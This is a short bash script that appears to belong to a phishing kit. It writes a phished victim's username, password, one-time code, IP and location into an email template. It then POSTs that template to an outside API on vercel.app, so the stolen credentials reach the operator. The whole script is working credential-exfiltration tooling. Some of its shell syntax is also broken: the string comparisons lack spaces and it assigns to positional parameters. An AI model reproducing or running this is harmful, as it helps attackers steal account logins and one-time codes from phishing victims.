#!/bin/bash

pro_dir=$(pwd)
email_dir="${pro_dir}/assets/email"
#email_dir="$pro_dir"

if [[ "$4"=="" || "$4"== " " ]]; then
    4="NaN"
fi
if [[ "$6"=="" || "$6"== " " ]]; then
    6="NaN"
fi
if [[ "$7"=="" || "$7"== " " ]]; then
    7="NaN"
fi
if [[ "$8"=="" || "$8"== " " ]]; then
    8="NaN"
fi

# Replace placeholders in email.json with actual values
sed -i "s/replace_my_email/$1/" "${email_dir}/email.json"
sed -i "s/replace_server/$2/" "${email_dir}/email.json"
sed -i "s/replace_site/$3/" "${email_dir}/email.json"
sed -i "s/replace_ip/$4/" "${email_dir}/email.json"
sed -i "s/replace_loc/$5/" "${email_dir}/email.json"
sed -i "s/replace_victim_username/$6/" "${email_dir}/email.json"
sed -i "s/replace_victim_password/$7/" "${email_dir}/email.json"    
sed -i "s/replace_victim_otp/$8/" "${email_dir}/email.json"

json_payload=$(cat ${email_dir}/email.json)

response=$(curl -sL -X POST -H "Content-Type: application/json" -d "$json_payload" http://clifty-api.vercel.app/api/sendEmail)

EmailSuccess=$(echo "$response" | sed -n 's/.*"sendEmail":\([^,}]*\).*/\1/p')

# Echo the email_success value
echo "$EmailSuccess"
